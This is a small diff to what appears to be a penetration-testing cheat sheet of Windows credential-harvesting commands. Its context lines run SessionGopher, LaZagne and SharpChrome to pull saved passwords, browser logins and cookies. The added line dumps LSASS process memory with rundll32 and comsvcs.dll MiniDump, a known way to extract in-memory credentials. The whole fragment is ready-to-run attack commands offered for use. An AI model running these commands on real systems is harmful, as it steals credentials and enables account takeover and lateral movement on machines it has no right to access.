@@ -149,6 +149,8 @@ Invoke-SessionGopher -Thorough
 .\lazagne.exe all
 
 .\SharpChrome.exe logins|cookies|statekeys /unprotect
+
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump [lsass pid] C:\lsass.dmp full
 ```
 ###### Windows Autologon
 ```
